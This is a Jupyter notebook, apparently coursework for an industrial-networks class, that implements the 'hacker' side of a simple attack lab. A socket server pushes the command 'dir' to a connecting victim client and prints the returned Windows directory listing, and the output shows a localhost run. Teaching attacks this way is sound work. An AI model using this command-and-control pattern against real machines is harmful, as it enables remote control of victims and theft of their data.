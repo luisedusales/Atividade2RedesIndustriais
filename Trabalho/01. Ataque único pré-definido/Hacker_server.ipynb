{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import subprocess\n",
    "import selectors"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "sel = selectors.DefaultSelector()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# função para aceitar\n",
    "def accept(sock, mask):\n",
    "    conn, addr = sock.accept()  # Should be ready\n",
    "    print('accepted', conn, 'from', addr)\n",
    "    conn.setblocking(False)\n",
    "    sel.register(conn, selectors.EVENT_READ, read)\n",
    "    conn.sendall(b'dir')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# função para leitura\n",
    "def read(conn, mask):\n",
    "    data = conn.recv(1024)  # Should be ready\n",
    "    if data:\n",
    "       print(repr(data))\n",
    "    else:\n",
    "       print('closing', conn)\n",
    "       sel.unregister(conn)\n",
    "       conn.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "accepted <socket.socket fd=1256, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 50000), raddr=('127.0.0.1', 50516)> from ('127.0.0.1', 50516)\n",
      "b' O volume na unidade C n\\xe3o tem nome.\\r\\n O N\\xfamero de S\\xe9rie do Volume \\xe9 E24F-8D8F\\r\\n\\r\\n Pasta de C:\\\\Users\\\\Acer\\\\OneDrive\\\\Documentos\\\\01. USP\\\\01 - Semestre Atual\\\\Redes\\\\Trabalho 2 - Lu\\xeds\\\\Trabalho\\\\01. Ataque \\xfanico pr\\xe9-definido\\r\\n\\r\\n26/11/2020  17:28    <DIR>          .\\r\\n26/11/2020  17:28    <DIR>          ..\\r\\n26/11/2020  16:57    <DIR>          .ipynb_checkpoints\\r\\n26/11/2020  17:28             1.486 Cliente_vitima.ipynb\\r\\n26/11/2020  17:28             2.170 Hacker_server.ipynb\\r\\n               2 arquivo(s)          3.656 bytes\\r\\n               3 pasta(s)   867.138.637.824 bytes dispon\\xedveis\\r\\n'\n",
      "closing <socket.socket fd=1256, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 50000), raddr=('127.0.0.1', 50516)>\n"
     ]
    }
   ],
   "source": [
    "HOST = \"\"\n",
    "PORT = 50000\n",
    "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "sock.bind((HOST, PORT))\n",
    "sock.listen(100)\n",
    "sock.setblocking(False)\n",
    "sel.register(sock, selectors.EVENT_READ, accept)\n",
    "\n",
    "while True:\n",
    "  events = sel.select()\n",
    "  for key, mask in events:\n",
    "    callback = key.data\n",
    "    callback(key.fileobj, mask)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
